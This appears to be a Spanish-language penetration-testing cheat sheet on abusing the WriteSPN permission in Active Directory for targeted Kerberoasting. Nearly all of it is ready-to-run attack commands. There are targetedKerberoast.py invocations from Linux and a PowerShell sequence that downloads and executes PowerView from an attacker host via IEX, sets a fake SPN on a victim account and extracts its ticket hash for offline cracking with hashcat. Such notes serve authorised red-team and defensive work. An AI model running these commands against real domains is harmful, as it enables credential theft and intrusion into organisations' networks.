## Abuso de WriteSPN

### Usuario con WriteSPN sobre otro Usuario

Si un usuario tiene `WriteSPN` sobre otro, puede asignarle un SPN falso para convertirlo en Kerberoastable y obtener su hash para crackearlo offline.

---

## Desde Linux (externamente — recomendado)

```shell
# Con contraseña
targetedKerberoast.py -v -d '<dominio>' -u '<usuario_controlado>' -p '<contraseña>'

# Con hash NT
targetedKerberoast.py -v -d '<dominio>' -u '<usuario_controlado>' -H :<hash_nt>
```

Con autenticación Kerberos:

```shell
# 1. Obtener el TGT
getTGT.py <dominio>/<usuario>:<contraseña> -dc-ip <ip_dc>

# 2. Exportar el ticket
export KRB5CCNAME=<archivo.ccache>

# 3. Ejecutar el ataque
targetedKerberoast.py -v -d '<dominio>' -u '<usuario>' -p '<contraseña>' -k --dc-host <maquina.dominio>
```

> 💡 Si aparece el error `KRB_AP_ERR_SKEW`, sincronizar el reloj con el DC antes de continuar.

---

## Desde Windows (internamente)

```powershell
# 1. Cargar PowerView
IEX (new-object net.webclient).downloadstring('http://<ip_atacante>/powerview.ps1')

# 2. Verificar que el usuario objetivo no tiene SPN asignado
Get-DomainUser '<usuario_victima>' | Select serviceprincipalname

# 3. Asignar un SPN falso para hacerlo Kerberoastable
Set-DomainObject -Identity 'usuario_victima' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

# 4. Solicitar el ticket y obtener el hash
$User = Get-DomainUser '<usuario_victima>'
$User | Get-DomainSPNTicket | fl
```

> 💡 Tras obtener el hash, crackearlo offline con `hashcat` usando el modo `-m 13100` (Kerberos TGS-REP etype 23).
